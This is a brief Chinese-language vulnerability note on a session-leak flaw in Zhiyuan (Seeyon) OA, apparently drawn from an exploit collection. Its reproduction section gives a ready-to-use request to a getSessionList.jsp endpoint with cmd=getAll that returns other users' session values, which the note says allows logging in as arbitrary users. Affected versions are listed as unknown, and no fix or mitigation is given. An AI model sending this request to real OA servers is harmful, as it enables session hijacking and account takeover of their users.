# 致远OA Session泄漏漏洞

## 漏洞描述

通过使用存在漏洞的请求时，会回显部分用户的Session值，导致出现任意登录的情况

## 影响版本

> [!NOTE]
>
> 未知

## 漏洞复现

请求 http://xxx.xxx.xxx.xxx/yyoa/ext/https/getSessionList.jsp?cmd=getAll

回显Session则存在漏洞

## 参考文章

[零组文库](http://www.0-sec.org)